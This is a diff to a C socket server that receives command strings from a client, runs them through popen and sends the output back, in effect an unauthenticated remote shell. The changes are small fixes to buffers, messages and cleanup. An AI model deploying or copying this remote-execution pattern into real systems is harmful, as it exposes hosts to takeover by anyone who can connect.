@@ -15,7 +15,7 @@ int main(int argc, char *argv[]){
 
 	char cmd[MAXSIZE];
 	char buffer[MAXSIZE];
-	char strings_msg[] = "";
+	char strings_msg[MAXSIZE+1];
 
 	FILE *output;
 
@@ -44,7 +44,7 @@ int main(int argc, char *argv[]){
 	binding = bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
 
 	if (binding < 0){
-		perror("[-] Bind error");
+		perror("[-] Bind error ");
 		exit(1);
 	}
 
@@ -84,15 +84,14 @@ int main(int argc, char *argv[]){
 		// Execute Linux command & create an output of this command
 		output = popen (strings_msg, "r");
 		if (output == NULL){
-			fputs("Failed to execute command, try again ! \n", stderr);
+			fputs("[+] Connexion with client closed ! \n", stderr);
+			close(server_socket);
 			exit(0);
 		}
 
-		else {
-			while (fgets(buffer, MAXSIZE-1, output) != NULL){
-				send(client_socket, buffer, strlen(buffer), 0);
-				sleep(0.01);
-			}
+		while (fgets(buffer, MAXSIZE-1, output) != NULL){
+			send(client_socket, buffer, strlen(buffer), 0);
+			sleep(0.01);
 		}
 	}
 
